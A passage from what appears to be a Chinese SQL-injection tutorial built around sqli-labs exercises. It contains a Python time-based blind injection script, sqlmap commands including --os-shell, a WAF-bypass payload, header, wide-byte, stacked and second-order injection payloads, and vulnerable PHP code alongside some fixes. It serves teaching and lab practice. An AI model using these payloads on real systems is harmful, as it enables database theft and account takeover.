title="POST型时间盲注脚本编写"></a>POST型时间盲注脚本编写</h4><p>我们只需要在布尔盲注上面添加if判断语句即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">                datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and if((ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;),sleep(3),1) #&quot;</span>.<span class="built_in">format</span>(sql,i,j)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (recive.elapsed.total_seconds()) &gt; <span class="number">3</span>:</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="p1pP5"></a></p><h3 id="sqlmap工具的使用-介绍"><a href="#sqlmap工具的使用-介绍" class="headerlink" title="sqlmap工具的使用 介绍"></a>sqlmap工具的使用<br /> 介绍</h3><p> sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。<br /><strong>基本参数：</strong><br /><a href="https://www.yuque.com/answer-ctd2h/ke230u/ep09acunfuwz1rlo?inner=zbNKC&view=doc_embed">SQL注入漏洞</a></p><p><a href="https://guuuuq.github.io/posts/11f9f536.html">sqlmap使用</a></p><p> <strong>sqlmap的基本使用</strong><br /><strong>1、检测注入点</strong><br />检测注入点时，get型要带上url中的参数，如</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234027973.png" alt="image-20230724234027973"></p><p>若sqlmap给出了相应的信息，则说明可以注入，我们接下来便可以进行爆库爆表爆字段爆数据的操作</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234105216.png" alt="image-20230724234105216"></p><p><strong>2、爆库</strong></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234116237.png" alt="image-20230724234116237"></p><p>获取当前数据库名</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234128116.png" alt="image-20230724234128116"></p><p><strong>3、爆表</strong></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234139507.png" alt="image-20230724234139507"></p><p><strong>4、爆字段</strong></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234153690.png" alt="image-20230724234153690"></p><p><strong>5、爆数据</strong></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234205049.png" alt="image-20230724234205049"></p><p>也可以指定字段爆数据：</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234217195.png" alt="image-20230724234217195"></p><p><strong>常用参数</strong></p><p>$$<br>| -p<br> | 标记注入点</p><p>| –data<br> | 指定post参数，如:–data “username&#x3D;admin&amp;password&#x3D;admin”</p><p>| -r<br> | 读取文件内容为监测数据，如: -r 1.txt</p><p>| –level<br> | 设置测试的等级（1-5，默认为1）lv2：cookie; lv3：user-agent，refere; lv5：host </p><p>| –risk<br> | 升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;<br />risk 3：or语句的测试;</p><p>| –random-agent<br> | 随机ua进行测试</p><p>| –cookie<br> | 指定cookie进行请求测试</p><p>| –os-shell<br> | 获取交互式shell</p><p>| –dbms<br> | 指定数据库类型 ，如: –dbms&#x3D;mysql </p><p>| –os<br> |  指定目标操作系统，如: –os&#x3D;windows</p><p>| –threads<br> |  设置线程数 1~10 ，默认为1 </p><p> |<br>$$<br><strong>sqlmap的POST型注入</strong><br /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># --data 指定参数 -p 标记注入点</span><br><span class="line">python sqlmap.py -u http://www.sqli.com/Less-11/ --data=&quot;uname=admin&amp;passwd=123123&amp;submit=Submit&quot; -p uname,passwd</span><br><span class="line"> # -r 读取数据包检测 -p 标记注入点</span><br><span class="line">python sqlmap.py -u http://www.sqli.com/Less-11/ -r 1.txt -p uname,passwd</span><br></pre></td></tr></table></figure><p><strong>可以绕waf的payload</strong><br />and(select*from(select+sleep(4))a&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select+1)&#x3D;’<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234510234.png" alt="image-20230724234510234"><br><a name="Fvj67"></a></p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234521508.png" alt="image-20230724234521508"><br /><strong>产生注入的条件</strong>：<br />- 能够对请求头消息进行修改<br />- 修改的请求头信息能够带入数据库进行查询<br />- 数据库没有对输入的请求信息做过滤<br /><strong>1. User-Agent注入</strong><br />User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。<br />以sqli-labs less-18关为例，登录用户密码：dumb ,0<br />1.1 判断注入点：user-agent值后面加上’，引发报错，确定存在sql注入<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234537489.png" alt="image-20230724234537489"><br />1.2 采用报错注入函数获取当前数据库名<br />‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234554437.png" alt="image-20230724234554437"><br /><strong>2. cookie注入</strong><br /></p><p>cookie功能多用于商城购物车，或者用户登录验证，可以对这些功能模块进行测试，抓取cookie包进行安全测试</p><p>cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》<a href="https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646553116780266210214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie">cookie</a> 。以sqli-labs less-20关为例，登录后<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234606665.png" alt="image-20230724234606665"><br />2.1 首先判断注入点，加 ‘ 单引号报错<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234618463.png" alt="image-20230724234618463"><br />2.2 采用报错注入函数获取当前数据库名<br />‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘<br /><strong>3. Referer注入</strong><br /> ** Referer：<strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br />以19关为例<br />1. 判断输入点，加单引号引发报错<br />2. 使用报错注入函数：<br />‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and ‘<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234632496.png" alt="image-20230724234632496"><br />方法都是一样的。<br /><strong>4. X-Forwarded-For 注入</strong><br /> ** X-Forwarded-For(XFF)：</strong>用来识别客户端最原始的ip地址。详见，传送门 -》<a href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646592716780261962393%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646592716780261962393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&utm_term=X-for">X-Forwarded-For sql注入</a><br><a name="qkYtg"></a></p><p>X-Forwarded-for简称XFF头，它代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP。通过Burp Suite住区数据包内容，将X-Forwarded-for设置为11.22.33.44，然后访问改URL，页面返回正常。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212811473.png" alt="image-20230804212811473"></p><p>将X-Forwarded-for设置为11.22.33.44’，再次访问该URL，页面返回MySQL的报错信息，结果如图63所示。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212914187.png" alt="image-20230804212914187"></p><p>​                                              图63 访问X-Forwarded-for:11.22.33.44’的结果</p><p>将X-Forwarded-for分别设置为11.22.33.44’ and 1&#x3D;1#和11.22.33.44’ and 1&#x3D;2#，再次访问该URL，结果如图64和图65所示。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212932641.png" alt="image-20230804212932641"></p><p>​                                           图64 访问X-Forwarded-for:11.22.33.44’ and 1&#x3D;1#的结果 </p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212953057.png" alt="image-20230804212953057"></p><p>​                                        图65 访问X-Forwarded-for:11.22.33.44’ and 1&#x3D;2#的结果</p><p>通过页面的返回结果，可以判断出改地址存在SQL注入漏洞，接着可以使用order by判断表中的字段数量，最终测试出数据库中存在4个字段，尝试使用Union注入方法，语法是X-Forwarded-for:-11.22.33.44’ union select 1,2,3,4#，如图66所示。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213106986.png" alt="image-20230804213106986"></p><p>​                                                                            图66 使用Union注入</p><p>接着，使用Union注入方法完成此次注入。</p><p>XFF注入代码分析<br>PHP中的getenv()函数用于获取一个环境变量的值，类似于$_SERVER或$_ENV，返回环境变量对应的值，如果环境变量不存在则返回FALSE。<br>使用以下代码即可获取客户端IP地址，程序先判断是否存在HTTP头部参数HTTP_CLIENT_IP，如果存在，则付给$ip，如果不存在，则判断是否存在HTTP头部参数HTTP_X_FORWARDED_FOR，如果存在，则赋给$ip，如果不存在，则将HTTP头部参数REMOTE_ADDR赋给$ip。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from users where `ip`=&#x27;<span class="subst">$ip</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot; : &quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来，将$ip拼接到select语句，然后将查询结果输出到界面上。<br>由于HTTP头部参数是可以伪造的，所以可以添加一个头部参数CLIENT_IP或X_FORWARDED_FOR。当设置X_FORWARDED_FOR&#x3D;1’ union select 1,2,3#时，执行的SQL语句为：<br><code>select * from user where ip=&#39;1&#39; union select 1,2,3#&#39;</code></p><p>此时SQL语句可以分为select * from user where <code>ip</code>&#x3D;’1’和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>宽字节案例引入</strong>       <br />宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id&#x3D;1’ 进行测试的时候，发现提交的单引号会被转义[&#39;]。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234645934.png" alt="image-20230724234645934"><br />接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query(“SET NAMES gbk”)，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234705320.png" alt="image-20230724234705320"><br />仔细看该函数，其利用正则匹配将 [ &#x2F;，’，” ]这些三个符号都过滤掉了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234717911.png" alt="image-20230724234717911"><br />关于preg_replace的正则用法可详看——&gt; <a href="https://blog.csdn.net/qq_44159028/article/details/114642034">命令执行与代码执行漏洞</a> 中搜索preg_replace <br />而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p><ol><li>让斜杠（\）失去作用</li><li>让斜杠（\）消失</li></ol><p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。<br /><strong>关于编码</strong><br />在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看 ——&gt; <a href="https://blog.csdn.net/qq_44159028/article/details/115201653">计算机中的编码问题</a></p><ol><li>某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</li></ol><p><strong>宽字节注入</strong>       <br />宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。<br />由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的<br />我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p><ul><li>‘           %27</li><li>\           %5c</li><li>%df&#39;    %df%5c’ &#x3D;》  運’</li></ul><p>我们输入 ?id&#x3D;1%df’，按道理来说将转义符吃掉了，结果应该是 id&#x3D;’ 運’  ‘ ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234734448.png" alt="image-20230724234734448"><br />其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234744050.png" alt="image-20230724234744050"><br />联合注入如下<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234757024.png" alt="image-20230724234757024"><br /><strong>GB2312与GBK的不同</strong><br />gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234757024.png"><br />结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234820730.png" alt="image-20230724234820730"><br />为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。<br />所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。<br /><strong>宽字节注入注入方法</strong><br />1. 黑盒<br />就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如<br />sqlmap.py -u “<a href="http://localhost/sqli-labs-master/Less-32/?id=1%EF%BF%BD%27">http://localhost/sqli-labs-master/Less-32/?id=1%df%27</a>“<br />2. 白盒<br />查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234820730.png"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234844893.png" alt="image-20230724234844893"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234858494.png" alt="image-20230724234858494"><br />如果存在上面说的，则存在宽字节注入。<br /><strong>宽字节注入修复</strong><br />1. mysql_real_escape_string<br />听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。<br />‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234858494.png"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234922353.png" alt="image-20230724234922353"><br />为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？<br />原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍<br />mysqli_set_charset(<em>connection,charset</em>)<em>;</em></p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><em>connection</em></td><td>必需。规定要使用的 MySQL 连接。</td></tr><tr><td><em>charset</em></td><td>必需。规定默认字符集。</td></tr></tbody></table><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234946785.png"><br />这样就防止了注入<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234946785.png" alt="image-20230724234946785"><br />即先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。<br />2. 设置参数,character_set_client&#x3D;binary<br />3. 使用utf-8编码<br><a name="kG0hQ"></a></p><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235100567.png" alt="image-20230724235100567"><br />执行<br />id&#x3D;1’;update users set password&#x3D;’123456’ where id&#x3D;1; –+ <br />意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235114479.png" alt="image-20230724235114479"><br /><strong>堆叠查询的局限性</strong><br />堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合)注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br><a name="xjitO"></a></p><h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p><ol><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li></ol><p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例<br /><strong>sqli-labs less-24</strong><br />1. 如下点击注册用户<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235133751.png" alt="image-20230724235133751"><br />这里注册用户名为 admin’#<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235144682.png" alt="image-20230724235144682"><br />此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235153897.png" alt="image-20230724235153897"><br />2. 对注册的账号进行登录然后修改密码为ccccc<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235207112.png" alt="image-20230724235207112"><br />此时提示密码已经成功修改了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235218495.png" alt="image-20230724235218495"><br />此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235228280.png" alt="image-20230724235228280"><br /><strong>漏洞原因</strong><br />1. 在进行用户注册的允许存在’和#这种特殊字符<br />2. 在修改密码页面的源码中，发现这里很明显存在注入漏洞<br />$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’$username’ and password&#x3D;’$curr_pass’ “;<br />当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc<br />$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’#’ and password&#x3D;’$curr_pass’ “;<br><a name="prvVM"></a></p><h3 id="Base64注入攻击"><a href="#Base64注入攻击" class="headerlink" title="Base64注入攻击"></a>Base64注入攻击</h3><p>Base64攻击的测试地址：<a href="http://127.0.0.1/sqli/base64.php?id=MQ==%E3%80%82">http://127.0.0.1/sqli/base64.php?id=MQ%3d%3d。</a><br>从URL中可以看出，ID参数经过Base64编码（%3d是&#x3D;的URL编码格式），解码后发现ID为1，尝试加上一个单引号并一起转换成Base64编码，如图59所示。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213802453.png" alt="image-20230804213802453"></p><p>​                                                                   图59 对1’进行Base64编码</p><p>当访问id&#x3D;1’编码后的网址时（<a 